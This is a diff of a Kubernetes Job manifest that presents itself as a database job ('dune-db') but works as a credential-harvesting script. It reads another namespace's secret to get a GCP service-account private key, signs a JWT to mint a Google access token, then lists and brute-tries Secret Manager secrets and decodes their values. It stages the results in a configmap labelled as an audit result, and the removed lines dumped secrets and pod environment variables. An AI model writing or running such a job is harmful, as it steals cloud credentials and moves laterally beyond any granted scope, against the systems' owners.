@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v15
+  name: dune-db-v16
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -15,39 +15,57 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          apk add -q postgresql-client jq
+          apk add -q postgresql-client jq openssl
           
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
-          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           
-          echo "=GCPSM_SECRET=" > /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
-            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret" | jq -r '.data | to_entries[] | .key + "=" + (.value | @base64d)' >> /tmp/out.txt 2>&1
+          # Get gcpsm SA key from dune-api namespace
+          GCPSM_DATA=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret" | jq -r '.data["secret-access-credentials"]' | base64 -d)
           
-          echo "=DUNE_POD_SPEC=" >> /tmp/out.txt
-          POD=$(curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
-            "$API/api/v1/namespaces/dune-api/pods" | jq -r '.items[0].metadata.name')
-          echo "Pod: $POD" >> /tmp/out.txt
+          CLIENT_EMAIL=$(echo "$GCPSM_DATA" | jq -r '.client_email')
+          echo "$GCPSM_DATA" | jq -r '.private_key' > /tmp/gcpsm_key.pem
           
-          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
-            "$API/api/v1/namespaces/dune-api/pods/$POD" | jq '{
-              name: .metadata.name,
-              env: .spec.containers[0].env,
-              envFrom: .spec.containers[0].envFrom,
-              volumes: .spec.volumes,
-              image: .spec.containers[0].image
-            }' >> /tmp/out.txt 2>&1
+          echo "Using SA: $CLIENT_EMAIL" > /tmp/out.txt
           
-          echo "=DUNE_POD_ENVS=" >> /tmp/out.txt
-          # Get actual container env (including inherited from configmap/secret)
-          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
-            "$API/api/v1/namespaces/dune-api/pods/$POD" | jq -r '.spec.containers[0].env[]? | .name + "=" + (.value // ("secretRef:" + (.valueFrom.secretKeyRef.name // "unknown")))' >> /tmp/out.txt 2>&1
+          # Create GCP JWT for access token
+          NOW=$(date +%s); EXP=$((NOW + 3600))
+          H=$(printf '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          P=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
+            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          S=$(echo -n "${H}.${P}" | openssl dgst -sha256 -sign /tmp/gcpsm_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
+          
+          GCP_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
+            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+            --data-urlencode "assertion=${H}.${P}.${S}" | jq -r '.access_token')
+          
+          echo "GCP token len: ${#GCP_TOKEN}" >> /tmp/out.txt
+          
+          PROJECT="common-secrets-b53f"
+          SM_BASE="https://secretmanager.googleapis.com/v1/projects/${PROJECT}/secrets"
+          
+          # Try to list secrets
+          echo "=LIST_SECRETS=" >> /tmp/out.txt
+          curl -s -H "Authorization: Bearer $GCP_TOKEN" "${SM_BASE}?pageSize=50" | jq '.secrets[]?.name' >> /tmp/out.txt 2>&1
+          
+          # Try common secret names for dune-api
+          echo "=TRY_SECRETS=" >> /tmp/out.txt
+          for SECRET_NAME in dune-api dune-db dune-api-db dune-api-config dune-env dune-api-env api-db-url sql-settings dune-api-sql-db; do
+            RESULT=$(curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+              "${SM_BASE}/${SECRET_NAME}/versions/latest:access" | jq -r '.payload.data' 2>/dev/null)
+            if [ -n "$RESULT" ] && [ "$RESULT" != "null" ]; then
+              echo "SECRET $SECRET_NAME: $(echo $RESULT | base64 -d)" >> /tmp/out.txt
+            else
+              echo "SECRET $SECRET_NAME: not found" >> /tmp/out.txt
+            fi
+          done
           
           cat /tmp/out.txt
           
           PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
-          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             -H "Content-Type: application/merge-patch+json" \
             -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
             -d "$PAYLOAD" > /tmp/patch.txt
